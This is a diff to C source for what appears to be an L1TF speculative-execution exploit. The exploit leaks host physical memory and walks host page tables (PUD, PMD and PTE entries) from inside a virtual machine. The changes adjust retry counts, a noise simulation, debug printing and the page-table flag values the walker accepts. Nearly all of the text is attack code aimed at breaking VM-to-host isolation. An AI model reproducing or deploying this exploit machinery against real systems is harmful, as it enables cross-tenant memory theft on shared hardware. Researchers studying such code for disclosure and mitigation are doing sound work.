@@ -15,6 +15,7 @@ hpa_t gadget_base(void)
         return l1tf_find_base();
 }
 
+
 void leak(void *data, hpa_t base, hpa_t pa, int len)
 {
 	leak_attempts += len;
@@ -25,7 +26,7 @@ void leak(void *data, hpa_t base, hpa_t pa, int len)
         memcpy(data, buf, len);
 #if LEAK == CHEAT_NOISY
 	for (int i = 0; i < len; i++)
-		if (rand() % 20 == 3)
+		if (rdrand() % 32 == 3)
 			((char *)data)[i] = 0;
 #endif
         return;
@@ -43,7 +44,7 @@ u64 leak64(hpa_t base, hpa_t pa)
 	if (verbose) {
 		u64 true = hc_read_pa(pa);
 		if (true != val) {
-			printf("\n{leak64: leaked: %lx, true = %lx (%s)}   ", val, true, true != val ? "ERROR" : "OK");
+			printf("\n{leak64: leaked: %lx, true = %lx (%s)}\n", val, true, true != val ? "ERROR" : "OK");
 			if ((true ^ val) & val) {
 				printf("\nUNRECONCILABLE ERROR!\n");
 				dump(true ^ val);
@@ -86,7 +87,7 @@ hva_t leak_ptr(hpa_t base, hva_t dm, hpa_t pa, int (*check)(va_t, va_t))
 		nr_tries_global = 0;
 	last_pa = pa;
 
-	for (int i = 0; i < 20; i++) {
+	for (int i = 0; i < 5; i++) {
 		hva_t ptr = leak64(base, pa);
 		if (check(ptr, dm))
 			return ptr;
@@ -113,7 +114,7 @@ pte_t leak_pte(hpa_t base, hpa_t pa)
 	if (verbose) {
 		u64 true = hc_read_pa(pa) & 0xffffffffff;
 		if (pte != true) {
-			printf("\n{leak_pte: leaked: %lx, true = %lx (%s)}   ", pte, true, true != pte ? "ERROR" : "OK");
+			printf("\n{leak_pte: leaked: %lx, true = %lx (%s)}\n", pte, true, true != pte ? "ERROR" : "OK");
 			if ((true ^ pte) & pte) {
 				printf("\nUNRECONCILABLE ERROR!\n");
 				dump(true ^ pte);
@@ -136,7 +137,7 @@ hpa_t translate(hpa_t base, hva_t va, hpa_t cr3, hva_t hdm)
 	if (verbose >= 2) printf("\ttranslate(base=%lx, va=%lx, cr3=%lx, hdm=%lx)\n", base, va, cr3, hdm);
 
 	if (hdm && in_direct_map(va, hdm)) {
-		if (verbose >= 1) { printf(" --{hdm}--> pa %lx\n", va-hdm); fflush(stdout); }
+		if (verbose >= 2) { printf(" --{hdm}--> pa %lx\n", va-hdm); fflush(stdout); }
 		return va - hdm;
 	}
 
@@ -173,7 +174,7 @@ retry_pud:
 	pte_t pud = leak_pte(base, pud_pa);
 	if (verbose >= 2) dumpp(pud);
 	if (verbose == 1) { printf("pud %10lx ", pud); fflush(stdout); }
-	if (!(((pud & 0xfff) == 0x067) || ((pud & 0xfff) == 0x907))) {
+	if (!(((pud & 0xfff) == 0x067) || ((pud & 0xfff) == 0x063) || ((pud & 0xfff) == 0x907))) {
 		if (verbose == 1) printf("\n\t--> ");
 		goto retry_pud;
 	}
@@ -199,7 +200,7 @@ retry_pmd:
 	pte_t pmd = leak_pte(base, pmd_pa);
 	if (verbose >= 2) dumpp(pmd);
 	if (verbose == 1) { printf("pmd %10lx ", pmd); fflush(stdout); }
-	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3))) {
+	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3) || ((pmd & 0xfff) == 0x0e3))) {
 		if (verbose == 1) printf("\n\t--> ");
 		goto retry_pmd;
 	}
